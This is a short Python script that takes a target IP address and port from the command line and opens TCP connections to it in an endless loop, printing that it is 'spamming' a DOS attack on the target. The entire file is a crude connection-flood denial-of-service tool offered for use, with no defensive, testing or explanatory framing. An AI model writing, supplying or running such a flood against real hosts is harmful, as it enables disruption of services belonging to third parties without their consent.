#!/usr/bin/python

import socket, sys

ip = sys.argv[1]
port = int(sys.argv[2])
    
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    print("Spamming DOS attack on ",ip," port ",port)
